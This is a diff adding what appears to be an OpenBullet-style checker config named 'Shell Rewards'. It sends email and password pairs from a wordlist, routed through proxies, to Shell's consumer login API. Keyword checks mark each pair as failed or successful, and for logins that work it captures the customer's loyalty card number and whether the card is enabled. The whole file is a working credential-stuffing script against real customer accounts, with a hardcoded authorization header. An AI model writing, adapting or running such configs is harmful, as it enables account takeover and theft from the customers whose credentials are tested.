@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "Shell Rewards",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T19:23:00.7752368+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://id.consumer.shell.com/api/v2/account/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"udid\":\"no-udid-provided\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Channel: Web" 
+  HEADER "X-SSO-Market: en-GB" 
+  HEADER "Authorization: Basic 462a782dc8add106f3ade2b567f51a434fd852aee9a58d32c2c629b263f8703d" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "incorrect_username_or_password_please_try_again" 
+  KEYCHAIN Success OR 
+    KEY "loyalty\":{\"accounts" 
+PARSE "<SOURCE>" LR "cardId\":\"" "\",\"cardEnabled" -> CAP "Card Number : " 
+PARSE "<SOURCE>" LR "cardEnabled\":" ",\"cardType" -> CAP "Card Enabled : " 
